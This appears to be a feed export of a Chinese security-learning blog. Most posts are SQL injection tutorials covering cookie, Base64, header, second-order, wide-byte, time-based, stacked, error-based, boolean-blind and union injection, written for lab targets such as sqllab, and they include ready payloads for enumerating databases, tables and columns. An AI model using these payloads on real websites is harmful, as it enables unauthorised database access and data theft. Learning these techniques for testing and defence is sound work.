punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> Response<span class="token punctuation">(</span>generate_frames<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>mimetype<span class="token operator">=</span><span class="token string">'multipart/x-mixed-replace;boundary=frame'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2023/03/19/cQ87hagSwpFA3CE.jpg" alt="效果就这样"><br>但是这样子做出来的很大缺陷:<br>1.没办法调倍速<br>2.没声音<br>3.不能循环播放之类的</p><p>但是，要想解决上面这些问题只需要再添加两行代码！！！<br>一行代码启动docker版nginx-rtmp服务<br>另一行代码使用FFmpeg推流，指定服务器地址<br>（我没试过，出问题别找我）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Python装饰器&quot;&gt;&lt;a href=&quot;#Python装饰器&quot; class=&quot;headerlink&quot; title=&quot;Python装饰器&quot;&gt;&lt;/a&gt;Python装饰器&lt;/h3&gt;&lt;h4 id=&quot;解释概念&quot;&gt;&lt;a href=&quot;#解释概念&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>Cookie/Base64/HTTP头部注入</title>
    <link href="https://liu1272.github.io/2023/03/15/cookie%E6%B3%A8%E5%85%A5/"/>
    <id>https://liu1272.github.io/2023/03/15/cookie%E6%B3%A8%E5%85%A5/</id>
    <published>2023-03-15T14:30:00.000Z</published>
    <updated>2023-03-17T05:30:58.644Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h3><h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>常见于&emsp;.asp?id=xx&emsp;之类的带参数的URL</p><h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><p>cookie是一些数据信息，类型为“小型文本文件”，存储于电脑上的文本文件中。<br>cookie是服务器创建后返回给游览器的。游览器只进行了保存。<br> 一般cookie是以键值对进行表示的(key-value)</p><pre><code>cookie常用属性的解释：       Name： cookie的名字       Value： cooke的值       Path： 定义了Web站点上可以访问该Cookie的目录       Expires： 表示cookie的过期时间，也就是有效值       Size： 表示cookie的大小</code></pre><p>cookie有2种存储方式，会话性（关浏览器就清除）和持久性（保留到有效期结束）</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>ASP脚本中的request对象，被用于从用户那里获取信息。<br>Request对象的使用方法：request.[集合名称]（参数名称）<br>但是它同时允许提交时省略集合名称<br>按QueryString、Form、Cookies、ServerVariables的顺序来获取数据的<br>所以，当未指明使用request对象的具体方法进行获取且未过滤语句时存在注入。</p><h4 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h4><p>（1）寻找.asp?id=xx这样的页面<br>（2）将“id=xx”删掉，看页面是否正常。不正常则说明参数在数据传递中启直接作用<br>（3）清空网址，输入</p><pre><code>javascript:alert(document.cookie=“id=”+escape(“xx”));document.cookie:表示当前浏览器中的cookie变量alert():弹出一个对话框escape():对字符串进行编码</code></pre><p>&emsp;&emsp;按Enter键后弹出一个对话框，内容是“id=xx”<br>&emsp;&emsp;然后重新输入原来URL回车<br>&emsp;&emsp;如果显示正常，说明是用Request(“id”)方式获取数据<br>（4）判断是否存在漏洞:将SQL判断语句带入，并重复第三步</p><pre><code>javascript:alert(document.cookie=“id=”+escape(“xx and 1=1”));javascript:alert(document.cookie=“id=”+escape(“xx and 1=2”));两次回显不一样则说明存在注入漏洞，并可以进行cookie注入</code></pre><p>（5）代入SQL语句</p><pre><code>javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;xx order by 2&quot;));javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;284 union select 1,…… from xx&quot;));</code></pre><h3 id="Base64注入"><a href="#Base64注入" class="headerlink" title="Base64注入"></a>Base64注入</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>程序对GET的传参进行接收，并且对其进行解码，然后再放入查询语句中。<br>这时候我们可以编码，然后程序执行的时候，会把我们所编码的注入语句解码，再拼接到了原本程序要执行的代码中</p><h4 id="讲解"><a href="#讲解" class="headerlink" title="讲解"></a>讲解</h4><p>Base64注入实质上并不是一个全新的注入手段，而是一种对数据处理的方法。<br>Base64注入可以发生在cookie注入中，只要有</p><pre><code>$id = base64_decode($_GET[&#39;id&#39;]);</code></pre><p>这个函数语句，就会发生Base64的解码，甚至可以加解密成其他的格式<br>此时就需要一个个试或者进行白盒测试了。</p><h3 id="最后总结一下HTTP头部注入"><a href="#最后总结一下HTTP头部注入" class="headerlink" title="最后总结一下HTTP头部注入"></a>最后总结一下HTTP头部注入</h3><p>原理:后台开发人员为了验证客户端HTTP Header（比如常用的Cookie验证等）或者通过HTTP Header头信息获取客户端的一些信息（例如：User-Agent、Accept字段等），会对客户端HTTP Header 进行获取并使用SQL语句进行处理，如果此时没有足够的安全考虑，就可能导致基于HTTP Header的注入漏洞</p><p>使用HTTP头部注入漏洞的前提条件:<br>（1）能够对请求头消息进行修改<br>（2）修改的请求头信息能够带入数据库执行<br>（3）数据库没有对输入的请求头做过滤</p><p>常见方法:<br>Cookie注入<br>User-Agent注入<br>Referer注入<br>XFF注入（X-Forwarded-For）</p><p>如果要详细了解请自行查询。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Cookie注入&quot;&gt;&lt;a href=&quot;#Cookie注入&quot; class=&quot;headerlink&quot; title=&quot;Cookie注入&quot;&gt;&lt;/a&gt;Cookie注入&lt;/h3&gt;&lt;h4 id=&quot;表现&quot;&gt;&lt;a href=&quot;#表现&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL二次注入&amp;宽字节注入</title>
    <link href="https://liu1272.github.io/2023/03/13/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
    <id>https://liu1272.github.io/2023/03/13/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</id>
    <published>2023-03-12T16:15:00.000Z</published>
    <updated>2023-03-13T16:43:35.294Z</updated>
    
    <content type="html"><![CDATA[<h3 id="SQL二次注入"><a href="#SQL二次注入" class="headerlink" title="SQL二次注入"></a>SQL二次注入</h3><h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>在二次注入中，一般不会是单纯的二次注入<br>通常会与报错注入或Bool盲注结合。<br>比如，在注册页面输入的用户名在登录后才有盲注的回显<br>这时候我们需要自己编写脚本模拟注册及登录。</p><p>无法通过扫描工具或者手工测试出来，二次注入一般在审计代码过程中发现<br>从前端或黑盒测试无法看到</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>攻击者构造恶意的数据并存储在数据库后<br>防御者对语句中的特殊字符进行了转义处理<br>但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中<br>当程序调用恶意数据并执行SQL查询时就发生了SQL二次注入。<br>总而言之:<br>用户输入恶意的数据库查询语句时会被转义，<br>但在数据库调用读取语句时又被还原导致语句执行。</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p><strong>第一步：构造恶意语句</strong><br>没有恶意代码怎么能行？先上传含有能被转义的字符的恶意查询语句<br><strong>第二步：插入恶意数据</strong><br>传入数据并任他对其中特殊字符进行转义处理，但在保存在数据库时<strong>保留了原来的味道</strong><br><strong>第三步：二次构造语句，引用恶意数据</strong><br>因为开发者默认存在数据库里的数据都是安全的<br>所以在进行查询时，直接从数据库中取出九转大肠<br>结果如下:<br><img src="https://s2.loli.net/2023/03/13/wrX4BSlGyjPmqgH.jpg" alt="只保留了一点原始的味道"></p><h4 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h4><h5 id="构造并存入一个恶意语句"><a href="#构造并存入一个恶意语句" class="headerlink" title="构造并存入一个恶意语句"></a>构造并存入一个恶意语句</h5><p>由于这种注入太难以被判断及发现，所以本文只作简单说明(其实是因为我太菜了)</p><pre><code>在注册等类似能上传并存储数据的页面存入admin&#39;#mysql_escape_string()等函数会在特殊字符前加 \ 造成过滤的效果</code></pre><p>此时传入时不会执行恶意代码，因为它过滤了。<br>但是存入的时候没有更改原来的数据。</p><h5 id="调用数据库中的恶意语句"><a href="#调用数据库中的恶意语句" class="headerlink" title="调用数据库中的恶意语句"></a>调用数据库中的恶意语句</h5><p>既然原来的数据没改，那就再调出来用(相当于执行了恶意代码)。</p><pre><code>下面是sqllab靶场的题，二次执行时整个语句变成了这样子update password=$new where username=admin&#39;#</code></pre><p>admin后引号对前面的单引号进行了闭合，#注释掉了后面的语句，就相当于对admin进行了改密</p><h3 id="SQL宽字节注入"><a href="#SQL宽字节注入" class="headerlink" title="SQL宽字节注入"></a>SQL宽字节注入</h3><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p>**单字节字符集:**所有的字符都使用一个字节来表示（ASCII 编码0-127）<br>**多字节字符集:**在多字节字符集中，用多个字节来表示（也有可能一部分用一个字节表示）<br>**宽字符:**用多个字节来代表的字符称之为宽字符<br>**字符、字符集:**字符是组成字符集的基本单位<br>**UTF8:**由于ASCII表示的字符只有128个，因此网络世界的规范是使用UNICODE编码，但是用ASCII表示的字符使用UNICODE并不高效。因此出现了中间格式字符集，被称为通用转换格式，及UTF。<br>**宽字节:**GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。</p><h4 id="表现-1"><a href="#表现-1" class="headerlink" title="表现"></a>表现</h4><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>1、宽字节注入是利用mysql的一个特性:<br>&emsp;&emsp;PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为\）<br>&emsp;&emsp;MYSQL默认字符集是GBK等宽字节字符集。<br>2、PHP发送请求到mysql，mysql在使用GBK编码的时候会认为两个字符是一个汉字<br>3、字符和转义的反斜杠组成了新的汉字，但是组成的新汉字又不是一个正常的汉字，就起到了注掉 \ 的作用</p><h4 id="转义函数"><a href="#转义函数" class="headerlink" title="转义函数"></a>转义函数</h4><pre><code>addslashes函数:对单引号(’)、双引号(&quot;)、反斜线(\)与x00 (NULL字符）magic_quotes_gpc函数:判断解析用户提交的数据，有post、get、cookie数据时增加转义字符“\”mysql_real_escape_string函数mysql_escape_string函数</code></pre><h4 id="注入方法-1"><a href="#注入方法-1" class="headerlink" title="注入方法"></a>注入方法</h4><p>方法一:<br>比如and’的编码是%df’，传参时单引号被加上\变成了 %df&#39;<br>其中\的十六进制是%5C ，那么现在 %df&#39; =%df%5c%27<br>如果程序的默认字符集是GBK等宽字节字符集<br>则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗</p><pre><code>也就是说:%df\&#39; = %df%5c%27=縗&#39;</code></pre><p>我们再回想到注入的三要素，有了单引号(闭合)后就好注入了</p><p>方法二:<br>使用汉字绕过。<br>PHP接收到一个汉字后通过UTF-8编码（三字节），并和\两两配对组成两个汉字，避免了后面引号的转义</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;SQL二次注入&quot;&gt;&lt;a href=&quot;#SQL二次注入&quot; class=&quot;headerlink&quot; title=&quot;SQL二次注入&quot;&gt;&lt;/a&gt;SQL二次注入&lt;/h3&gt;&lt;h4 id=&quot;表现&quot;&gt;&lt;a href=&quot;#表现&quot; class=&quot;headerlink&quot; title=&quot;表</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL时间注入&amp;堆叠注入</title>
    <link href="https://liu1272.github.io/2023/03/12/SQL%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5/"/>
    <id>https://liu1272.github.io/2023/03/12/SQL%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5/</id>
    <published>2023-03-12T15:11:00.000Z</published>
    <updated>2023-03-12T16:41:31.525Z</updated>
    
    <content type="html"><![CDATA[<h3 id="SQL时间注入"><a href="#SQL时间注入" class="headerlink" title="SQL时间注入"></a>SQL时间注入</h3><h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>无论输入什么都会返回正常的处理信息或者页面无回显<br>能依靠自身感知到页面的延时情况</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>前端在将数据传给后台时，设置了一个if语句<br>当条件为真时执行sleep语句，条件为假时无执行语句</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>时间注入又称延时注入，与布尔盲注同属于盲注无回显的类型。<br>如果想要注入，必不可少的是得看得到效果。<br>那么有没有什么方法能直接或是间接地显示或猜解出数据呢？<br>当然有！前面就已近提到过函数这个东西了。<br>函数与and结合时，如果传入的参数正确就会触发函数，否则不执行。<br>此时将函数与查询语句结合后再与传入的参数结合就能达到最终效果了。</p><h4 id="相关函数讲解"><a href="#相关函数讲解" class="headerlink" title="相关函数讲解"></a>相关函数讲解</h4><pre><code>if(a,b,c)                如果a是TRUE(a!=0或a!=NULL)，则返回b，否则返回csleep(x)                 延时x秒if(a,b,c)                a为真，执行b；否则执行cbenchmark(a,b)           a为操作次数，b为执行的函数                         原理是通过多次操作，让极短暂的延时增加到能识别的程度                         后面几个都是这种思想笛卡尔积                  别问，老子离散数学还没学到这！get_lock(key, timeout)   key(最好是数字)指定名称获取锁，timeout指定锁定时间                         前提条件是数据库连接是长连接正则bug                  利用大量正则计算延长时间，实现延时除此之外还有case … when … then … else … end</code></pre><h4 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h4><h5 id="判断是否存在注入点及注入的类型"><a href="#判断是否存在注入点及注入的类型" class="headerlink" title="判断是否存在注入点及注入的类型"></a>判断是否存在注入点及注入的类型</h5><pre><code>?id=1?id=5?id=5&#39;?id=5&quot;?id=5 and 1=1?id=5 and 1=2</code></pre><p>如果页面显示结果一样，那就说明可能是延时注入</p><h5 id="获取库长度"><a href="#获取库长度" class="headerlink" title="获取库长度"></a>获取库长度</h5><pre><code>?id=1 and if(length(database())&lt;10,sleep(5),1)?id=1 and if(length(database())=4,sleep(5),1)</code></pre><p>如果第一个没有延时，但是第二个有5秒延时则表名数据库名长度为4</p><h5 id="获取库名、表名、字段名及字段内容"><a href="#获取库名、表名、字段名及字段内容" class="headerlink" title="获取库名、表名、字段名及字段内容"></a>获取库名、表名、字段名及字段内容</h5><pre><code>爆数据库名?id=1 and if(ascii(substr(database(),1,1))=106,sleep(5),1)测试表数量?id=1 and (select count(table_name) from information_schema.tables where table_schema = database())&lt;5测试第一张表长度?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&lt;10测试表名?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;100测试表中字段数量?id=1 and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273)=5测试字段内容?id=1 and (select count(name) from users)=4</code></pre><p>这时候你会发现这就是布尔盲注的做法<br>一个一个跑咯，懒得细细讲解了</p><h3 id="SQL堆叠注入"><a href="#SQL堆叠注入" class="headerlink" title="SQL堆叠注入"></a>SQL堆叠注入</h3><h4 id="表现-1"><a href="#表现-1" class="headerlink" title="表现"></a>表现</h4><p>跟联合查询注入差不多，两个方式相应的真假值都有不同的回显。</p><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>在SQL中，分号表示一条 sql 语句的结束。<br>在分号后继续构造下一条语句，就会把两条语句一起执行。<br><strong>联合注入</strong>也是将两条语句合并在一起，两者之间有什么区别么？<br>union执行的语句类型是有限的，而堆叠注入可以执行任意语句。</p><h4 id="开始注入-1"><a href="#开始注入-1" class="headerlink" title="开始注入"></a>开始注入</h4><h5 id="检查注入点及回显位"><a href="#检查注入点及回显位" class="headerlink" title="检查注入点及回显位"></a>检查注入点及回显位</h5><pre><code>?id=1&#39;?id=1&#39; and 1=1--+?id=1&#39; and 1=2--+</code></pre><h5 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h5><p>方法前面都有讲，回去抄payload就行了<br>加入分号，再接一个SQL语句看是否能显出结果。</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p>今天不讲一句，讲一段话。</p><p><strong>人像摄影，更强调人物本身的特点，仿佛这个人就在你面前一样。<br>但是每个人不同的身高决定了站立时必定不能拍出完美的图片。<br>因此，拍人像时，最简单的一个办法就是用跟他们同样的视角拍摄，<br>这样才能看见他们更多的表情、神态和动作。<br>你才能看到他们的世界，画面才会更有吸引力。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;SQL时间注入&quot;&gt;&lt;a href=&quot;#SQL时间注入&quot; class=&quot;headerlink&quot; title=&quot;SQL时间注入&quot;&gt;&lt;/a&gt;SQL时间注入&lt;/h3&gt;&lt;h4 id=&quot;表现&quot;&gt;&lt;a href=&quot;#表现&quot; class=&quot;headerlink&quot; title=&quot;表</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL报错注入</title>
    <link href="https://liu1272.github.io/2023/03/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    <id>https://liu1272.github.io/2023/03/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</id>
    <published>2023-03-12T03:37:00.000Z</published>
    <updated>2023-03-12T04:15:17.647Z</updated>
    
    <content type="html"><![CDATA[<h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>数据库在执行时，遇到语法不对，会显示报错信息，比如错误语句:select’</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在公司开发项目是通常程序开发期间需要告诉使用者某些报错信息，方便程序员进行调试修复，定位文件错误，而且开发中会经常使用异常处理函数，捕获错误信息，比如在PHP中使用mysql_error()函数。如果SQL注入存在时，会有报错信息返回就可以采用报错注入进行攻击啦！！！</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>报错注入嘛，首先肯定要让它报错呀。<br>那么什么时候才会报错呢？</p><pre><code>Xpath语法错误     extractvalue(1,(concat(0x7e,(payload),0x7e)))     updatexml(1,(concat(0x7e,(payload),0x7e)))     0x7e这个十六进制数代表符号~，~这个符号在xpath语法中是不存在的，因此总能报错     详细的使用方法请自行查找数据溢出错误     exp(x)     当参数x超过710时，exp()函数会报错主键重复错误     floor(x)：     count()和group by遇到rand()产生的重复值时报错函数特性报错     使用name_const来制造一个列     mysql列名重复会报错参数类型报错(不写了，自己找去)</code></pre><p>现在有了报错，怎么利用？<br>忘记了那个and和or语句了吗？<br>把SQL语句放到产生报错的语句中，<br>再将原本要传入的参数和上面已经结合起来的语句用and合为payload。</p><h4 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h4><h5 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h5><pre><code>?id=1&#39; -- a</code></pre><p>老一套了，直接拿来用。</p><h5 id="判断是否是报错注入"><a href="#判断是否是报错注入" class="headerlink" title="判断是否是报错注入"></a>判断是否是报错注入</h5><pre><code>?id=1&#39; and updatexml(1,&#39;~&#39;,3) -- a</code></pre><p>如果报错了那说明是的，这里可以多换几个函数。<br>要让前面一半正常执行！</p><h5 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h5><pre><code>?id=-1&#39; and updatexml(1,concat(&#39;~&#39;,    substr(         (select group_concat(schema_name)        from information_schema.schemata)    , 1 , 31)),3) -- a</code></pre><p>一样的，函数自己换<br>但是注意高版本数据库基本上都没有这个漏洞了<br>尽管这样，一旦有漏洞就能用这个库跑了</p><h5 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h5><pre><code>?id=1&#39; and updatexml(1,concat(&#39;~&#39;,    substr(         (select group_concat(table_name)        from information_schema.tables        where table_schema = &#39;库名&#39;)    , 1 , 31)),3) -- a</code></pre><h5 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h5><pre><code>?id=1&#39; and updatexml(1,concat(&#39;~&#39;,    substr(         (select group_concat(column_name)        from information_schema.columns        where table_schema = &#39;库名&#39; and table_name = &#39;表名&#39;)    , 1 , 31)),3) -- a</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;表现&quot;&gt;&lt;a href=&quot;#表现&quot; class=&quot;headerlink&quot; title=&quot;表现&quot;&gt;&lt;/a&gt;表现&lt;/h4&gt;&lt;p&gt;数据库在执行时，遇到语法不对，会显示报错信息，比如错误语句:select’&lt;/p&gt;
&lt;h4 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; cl</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL布尔盲注(延时注入后面再写)</title>
    <link href="https://liu1272.github.io/2023/03/12/SQL%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
    <id>https://liu1272.github.io/2023/03/12/SQL%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</id>
    <published>2023-03-12T02:39:00.000Z</published>
    <updated>2023-03-12T03:36:37.119Z</updated>
    
    <content type="html"><![CDATA[<h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>在测试中不会展现任何数据库报错内容，但是网页中真和假有着不同的回显。<br>或者为真时返回正常页面，为假时跳转到其它页面等。</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在后端的PHP代码中，对你传入的数据进行了处理并判断<br>判断是True或False会执行不同代码</p><h4 id="开始注入-二分法"><a href="#开始注入-二分法" class="headerlink" title="开始注入(二分法)"></a>开始注入(二分法)</h4><h5 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h5><p>使用一些判断真假的语句来进行判定<br>当它是数字型时:</p><pre><code>1&#39; and 1=0 --+1&#39; and 1=1 --+</code></pre><p>如果第一个与第二个回显不一样那么可能是布尔盲注<br>但是不排除有些丧心病狂的扑街预判了你的预判<br>这时候修改为不常见的数值（如1352=1352等）</p><p>当它是字符串型注入时:</p><pre><code>1&#39; and &#39;1&#39;=&#39;114514 --+1&#39; and &#39;1&#39;=&#39;666 --+</code></pre><h5 id="猜数据库名长度"><a href="#猜数据库名长度" class="headerlink" title="猜数据库名长度"></a>猜数据库名长度</h5><p>这个应该很好理解吧，既然它不告诉你有啥，那你就自己猜咯。<br>刚刚好又有and可以判断语句，是不是天无绝人之路？</p><pre><code>1&#39; and (length(database()))&gt;x--+</code></pre><p>当报错的时候就说明数据库名字长度是x-1了嘛</p><h5 id="猜数据库名（ASCII码）"><a href="#猜数据库名（ASCII码）" class="headerlink" title="猜数据库名（ASCII码）"></a>猜数据库名（ASCII码）</h5><pre><code>1&#39; and ascii(substr(database(),1,1))&gt;100--+1&#39; and ascii(substr(database(),1,1))&lt;150--+</code></pre><p>这样子一直用二分法来缩小数据库名的ASCII码范围直到求出最终值。<br>是不是很麻烦？是就对了！<br>现在是告诉你注入原理，不看就滚犊子。</p><h5 id="猜表名"><a href="#猜表名" class="headerlink" title="猜表名"></a>猜表名</h5><pre><code>1&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;100--+1&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&lt;150--+</code></pre><p>方法其实是和前面的联合查询注入一样的，多了个二分法而已<br>其实拿SQLmap和BP跑也是差不多的原理，只是自动化注入罢了</p><h5 id="猜字段名"><a href="#猜字段名" class="headerlink" title="猜字段名"></a>猜字段名</h5><pre><code>1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),1,1)))&gt;50--+1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),1,1)))&lt;80--+</code></pre><p>还是一样的</p><h5 id="猜数据"><a href="#猜数据" class="headerlink" title="猜数据"></a>猜数据</h5><pre><code>1&#39; and (ascii(substr(( select  id users limit 0,1),1,1)))&lt;80--+1&#39; and (ascii(substr(( select  id users limit 0,1),1,1)))&gt;30--+</code></pre><p>仍然是一样的</p><h4 id="开始注入-字符判断法"><a href="#开始注入-字符判断法" class="headerlink" title="开始注入(字符判断法)"></a>开始注入(字符判断法)</h4><p>数据库名字长度的判断跟上面的的一样<br>对每一位猜解都要写很多次判断语句<br>判断这些字符数字</p><pre><code>0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.@_</code></pre><h4 id="使用Burp-Suite注入"><a href="#使用Burp-Suite注入" class="headerlink" title="使用Burp_Suite注入"></a>使用Burp_Suite注入</h4><p>由于手工进行一一判断，工作量较大，可使用Burp_Suite中的字典进行。<br>1、抓包并将数据包传送到intruder<br>2、对对应位置进行上面提到的字符数字爆破:</p><pre><code>http://192.168.162.128/?id=1&#39; and if(SUBSTRING(database(),$1$,1)=$d$,1,0)–+&amp;Submit=Submit#</code></pre><p>payload set中分别设置并开始attack:<br>number类型，从1到数据库名字长度，步长为1<br>simple list类型，导入字符数字的字典</p><p><em><strong>后面的同理，自己举一反三吧</strong></em></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;表现&quot;&gt;&lt;a href=&quot;#表现&quot; class=&quot;headerlink&quot; title=&quot;表现&quot;&gt;&lt;/a&gt;表现&lt;/h4&gt;&lt;p&gt;在测试中不会展现任何数据库报错内容，但是网页中真和假有着不同的回显。&lt;br&gt;或者为真时返回正常页面，为假时跳转到其它页面等。&lt;/p&gt;
&lt;h4</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL联合注入</title>
    <link href="https://liu1272.github.io/2023/03/12/SQL%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"/>
    <id>https://liu1272.github.io/2023/03/12/SQL%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</id>
    <published>2023-03-11T16:47:00.000Z</published>
    <updated>2023-03-12T02:21:28.447Z</updated>
    
    <content type="html"><![CDATA[<h3 id="SQL联合注入"><a href="#SQL联合注入" class="headerlink" title="SQL联合注入"></a>SQL联合注入</h3><h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>有回显且可进行联合查询</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>SQL中union select查询的方式将结果合在一起，并删除重复的数据。这就是联合查询。</p><h4 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h4><p>1、判断是否存在注入点<br>（1）修改参数值，查看数据是否改变<br>（2）插入单、双引号的检测方法，未闭合的单引号会有报错</p><p>2、判断注入点是整形还是字符型<br>（1）数字型：通过</p><pre><code>and 1=1</code></pre><p>（2）字符串型：闭合单引号测试语句</p><pre><code>&#39;and&#39;1&#39;=&#39;1</code></pre><p>3、判断查询列数</p><pre><code>select username,password from where username=&#39;root&#39; and password=123 order by x</code></pre><p>当输入x报错时，真实的列数是「x-1」<br>(1)为什么用order by 可以证明前面语句查询了三列数据呢？<br>&emsp;&emsp;select * from order by (你要按照排序的对象)<br>&emsp;&emsp;order by可以按照指定的「字段名」排序<br>&emsp;&emsp;还可以按照「索引」进行排序，索引就是从左至右将列名按照123排序<br>&emsp;&emsp;对MySQL中查询结果按照指定字段名进行排序，左边第一个字段对应的索引是 1<br>&emsp;&emsp;当输入的索引溢出时它就会报错。<br>(2)我们为什么要知道前面查询了多少语句呢？<br>&emsp;&emsp;因为union前面查询语句查询的元素与后面查询语句查询的元素要在数量上一样<br>&emsp;&emsp;select 甲,乙,丙 union select 1,2,3<br>&emsp;&emsp;因为前面查询的语句有三个元素（甲，乙，丙）<br>&emsp;&emsp;所以后面查询的语句必须是三个元素（1，2，3）</p><p>4、找到显示位</p><pre><code>?id=-1 union select 1,2,3,4,5,6 --+</code></pre><p>如果在使用UNION SELECT 1,2,3…,11 from 